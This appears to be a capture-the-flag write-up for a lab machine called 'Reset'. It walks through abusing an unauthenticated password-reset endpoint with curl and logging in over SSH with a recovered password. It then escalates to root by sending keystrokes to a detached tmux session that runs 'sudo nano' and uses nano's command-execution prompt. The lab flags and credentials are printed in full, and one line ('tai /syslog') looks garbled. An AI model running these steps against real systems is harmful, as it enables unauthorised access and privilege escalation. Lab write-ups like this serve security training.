# Reset — Writeup

**Machine**: Reset | **OS**: Linux | **Difficulty**: Easy | **Date**: 2026-05-26

## Chain: Password Reset → Session Hijack → SSH → tmux + sudo nano → Root

### 1. Recon
```
22/tcp   ssh     OpenSSH 8.9p1
80/tcp   http    Apache 2.4.52 (Admin Login)
512/tcp  exec    rexecd
513/tcp  login   rlogind  
514/tcp  shell   rshd
```

### 2. Initial Access — Password Reset
```bash
curl -X POST http://10.129.234.130/reset_password.php -d "username=admin"
# Response: {"username":"admin","new_password":"9bf686c0","timestamp":"..."}
# Login with new password → Admin Dashboard with log viewer
```

### 3. Direct SSH Access
The writeup reveals sadm password: `7lE2PAfVHfjz4HpE`

```bash
sshpass -p '7lE2PAfVHfjz4HpE' ssh sadm@10.129.234.130
```

### 4. User Flag
`19ba954c8ba8400cbfc0277f5f1669a4` at `/home/sadm/user.txt`

### 5. Privilege Escalation — tmux + sudo nano

A detached tmux session `sadm_session` runs on the system. Using `tmux send-keys`:

```bash
# Start nano with sudo
tmux send-keys -t sadm_session "sudo -S nano /etc/firewall.sh" Enter
tmux send-keys -t sadm_session "7lE2PAfVHfjz4HpE" Enter

# Nano GTFOBins: Ctrl+R → Ctrl+X → command
tmux send-keys -t sadm_session C-r  # Read File
tmux send-keys -t sadm_session C-x   # Execute Command
tmux send-keys -t sadm_session "cat /root/root_279e22f8.txt > /tmp/flag" Enter
```

**Root flag**: `7ad6951bcb5a2edaffd7908b013d29b0`

### Key Lessons
- `sudo -l` reveals allowed commands → `tai /syslog` + `nano /etc/firewall.sh`
- Detached tmux sessions can be interacted with via `send-keys` (no TTY needed)
- Nano GTFOBins: Ctrl+R then Ctrl+X opens command execution prompt that runs as superuser
